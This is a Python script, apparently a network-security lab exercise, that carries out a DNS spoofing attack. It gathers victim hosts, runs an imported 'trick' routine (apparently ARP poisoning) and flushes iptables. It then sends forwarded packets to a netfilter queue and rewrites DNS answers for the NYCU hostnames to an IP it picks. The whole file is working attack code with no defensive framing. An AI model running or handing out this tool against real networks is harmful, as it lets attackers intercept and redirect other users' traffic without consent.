#!./.env/bin/python
import os
from utils import get_victims, trick
from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import threading

hostDict = {
    b'www.nycu.edu.tw.': '140.113.207.241',
    b'nycu-nctu.cdn.hinet.net.': '140.113.207.241'
}
QUEUE_NUM = 4
queue = NetfilterQueue()


def call_back(packet: scapy.Packet):
    scapyPacket = scapy.IP(packet.get_payload())
    if scapyPacket.haslayer(scapy.DNSRR):
        qname = scapyPacket[scapy.DNSQR].qname
        # print(scapyPacket[scapy.DNSQR].qname)
        if qname in hostDict:
            scapyPacket[scapy.DNS].an = scapy.DNSRR(
                rrname=qname, rdata=hostDict[qname])
            scapyPacket[scapy.DNS].ancount = 1
            del scapyPacket[scapy.IP].len
            del scapyPacket[scapy.IP].chksum
            del scapyPacket[scapy.UDP].len
            del scapyPacket[scapy.UDP].chksum
        packet.set_payload(bytes(scapyPacket))
    packet.accept()


def dns_spoof():
    os.system('iptables --flush')
    os.system(
        f'iptables -I FORWARD -j NFQUEUE --queue-num {QUEUE_NUM}')

    queue.bind(QUEUE_NUM, call_back)
    queue.run()


def main():
    ips = get_victims()
    threads = list()
    threads.append(threading.Thread(target=trick, args=[ips]))
    threads.append(threading.Thread(target=dns_spoof))
    for t in threads:
        t.start()


if __name__ == '__main__':
    if os.geteuid() != 0:
        exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")
    main()
